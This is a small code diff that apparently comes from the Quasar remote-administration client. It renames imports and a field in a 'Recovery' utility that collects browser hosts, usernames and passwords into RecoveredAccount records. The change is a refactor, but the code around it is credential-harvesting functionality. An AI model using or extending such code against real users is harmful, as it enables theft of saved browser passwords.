@@ -1,10 +1,9 @@
-﻿using System;
+﻿using Quasar.Common.Models;
+using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Security.Cryptography;
 using System.Text;
-using xClient.Core.Data;
-using xClient.Core.Utilities;
 
 namespace xClient.Core.Recovery.Utilities
 {
@@ -47,7 +46,7 @@ namespace xClient.Core.Recovery.Utilities
                     {
                         data.Add(new RecoveredAccount
                         {
-                            URL = host,
+                            Url = host,
                             Username = user,
                             Password = pass,
                             Application = browser
